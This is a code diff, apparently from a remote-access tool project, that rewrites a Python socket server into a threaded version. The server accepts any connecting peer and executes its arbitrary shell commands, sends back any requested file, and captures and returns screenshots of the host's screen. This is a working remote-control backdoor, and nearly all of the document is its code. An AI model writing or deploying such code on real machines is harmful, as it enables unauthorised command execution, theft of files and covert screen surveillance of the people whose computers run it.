@@ -1,100 +1,125 @@
+import socket
+import subprocess
+import threading
 import platform
 import os
+
 from PIL import ImageGrab
 
-from base import *
-from spliter import commande_spliter
+from base import PORT, ENCODING, DISCONNECT_MESSAGE
+from base import change_dir, send_header_and_data, recv_header_and_data
+
+from output_color import colored_error, colored_info, colored_success
+from splitter import command_splitter
+
+SERVER_IP = socket.gethostbyname(socket.gethostname())
+ADDR = (SERVER_IP, PORT)
+
+clients = {}
+
+server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, socket.SOCK_STREAM)
+
+server_socket.bind(ADDR)
 
 
-class Target(ServerSocket):
+def handle_clients(addr: tuple):
+    """Handle each client connected to the server
 
-    def __init__(self):
-        super().__init__()
+    Args:
+        addr (tuple): address of client
+    """
+    print(colored_success('💻 New connection: ') +
+          f'[{addr[0]}:{addr[1]}] connected 💻 ' +
+          colored_info(f'[{threading.active_count() - 1}  Clients]')
+          )
 
-    async def accept_commands(self, addr: tuple):
-        while True:
-            result = None
-            commande = await recv_header_and_data(recv_sock=self.clientsockets[addr])
-            commande = commande.decode(encoding=ENCODING)
-            splited_commande = commande_spliter(commande)
+    while True:
+        command = recv_header_and_data(recv_sock=clients[addr]).decode(encoding=ENCODING)
+        splitted_command = command_splitter(command)
 
-            if not commande:
-                break
+        if not command:
+            break
 
-            elif commande == 'exit':
-                break
+        if command == DISCONNECT_MESSAGE:
+            break
 
-            elif commande.lower() == 'os':
-                result = platform.platform() + '\n'
+        if command.lower() == 'os':
+            result = platform.platform() + '\n'
 
-            elif commande.lower() == 'info':
-                result = os.getcwd()
+        elif command.lower() == 'info':
+            result = os.getcwd()
 
-            elif splited_commande[0] == 'cd':
-                try:
-                    os.chdir(splited_commande[1])
-                    result = os.getcwd() + '\n'
-                except FileNotFoundError as err:
-                    result = str(err)
+        elif command.lower() == 'clients':
+            result = ''
+            for num, address in enumerate(clients.keys()):
+                result += f'[Client {num+1}]: [{address[0]}:{address[1]}]\n'
 
-            elif splited_commande[0] == 'download':
-                try:
-                    with open(splited_commande[1], 'rb') as f:
-                        result = f.read()
-                except FileNotFoundError:
-                    result = 'filenotfound'
-                except IsADirectoryError:
-                    result = 'isdir'
+        elif splitted_command[0] == 'cd':
+            result = change_dir(splitted_command[1])
 
-            elif splited_commande[0] == 'capture':
-                try:
-                    image = ImageGrab.grab()
-                    image.save(splited_commande[1], 'png')
-                    with open(splited_commande[1], 'rb') as img:
-                        result = img.read()
-                    os.remove(splited_commande[1])
-                except OSError:
-                    result = 'screenshot-error'
+        elif splitted_command[0] == 'download':
+            try:
+                with open(splitted_command[1], 'rb') as f:
+                    result = f.read()
+            except FileNotFoundError:
+                result = 'file not found'
+            except IsADirectoryError:
+                result = 'is a directory'
 
+        elif splitted_command[0] == 'capture':
+            try:
+                image = ImageGrab.grab()
+                image.save(splitted_command[1], 'png')
+                with open(splitted_command[1], 'rb') as img:
+                    result = img.read()
+                os.remove(splitted_command[1])
+            except OSError:
+                result = 'screenshot-error'
+
+        else:
+            output = subprocess.run(command, shell=True, universal_newlines=True,
+                                    capture_output=True, check=False)
+            if output.stdout is None:
+                result = colored_error('❗ Error')
+            elif output.stdout == '':
+                result = colored_error(output.stderr)
             else:
-                proc = await asyncio.create_subprocess_shell(
-                    commande,
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE,
-                )
+                result = output.stdout
 
-                stdout, stderr = await proc.communicate()
+        if command.lower() != 'info':
+            print(colored_info(f'[{addr[0]}:{addr[1]}] ⌨ >') + f' {command}')
 
-                if stdout:
-                    result = stdout
-                if stderr:
-                    result = stderr
+        if not result:
+            result = colored_error('❗ Error')
 
-            if commande.lower() != 'info':
-                print(f' ⌨️ > {commande}')
+        if isinstance(result, str):
+            result = result.encode(encoding=ENCODING)
 
-            if not result or result == '':
-                await send_header_and_data(self.clientsockets[addr], f'❗ No output'.encode(encoding=ENCODING))
-            else:
-                if isinstance(result, str):
-                    result = result.encode(encoding=ENCODING)
-                await send_header_and_data(self.clientsockets[addr], result)
+        send_header_and_data(clients[addr], result)
 
-        print(f'\n‼️{addr[0]}: {addr[1]} Deconnecte\n')
-        self.clientsockets[addr].close()
-        del self.clientsockets[addr]
-
-    async def handle_clients(self, addr: tuple):
-        print(f'💻 {addr} connecte 💻')
-        task = asyncio.create_task(self.accept_commands(addr))
-        await task
+    print(colored_success(f'👋 [{addr[0]}: {addr[1]}] Disconnected'))
+    del clients[addr]
 
 
-async def main():
-    target = Target()
-    task = asyncio.create_task(target.listen())
-    await task
+def start_server():
+    """Start the server and listen for clients connections
+    """
+    server_socket.listen()
+    print('📡 Server start at ' + colored_info(f'[{SERVER_IP}:{PORT}]') + ' 📡')
+    while True:
+        try:
+            client_socket, client_address = server_socket.accept()
+        except KeyboardInterrupt:
+            break
+        else:
+            clients[client_address] = client_socket
+            thread = threading.Thread(target=handle_clients, args=(client_address,))
+            thread.start()
+
+    server_socket.close()
+    print(colored_error('👻 Server down.'))
 
 
 if __name__ == '__main__':
-    asyncio.run(main())
+    start_server()
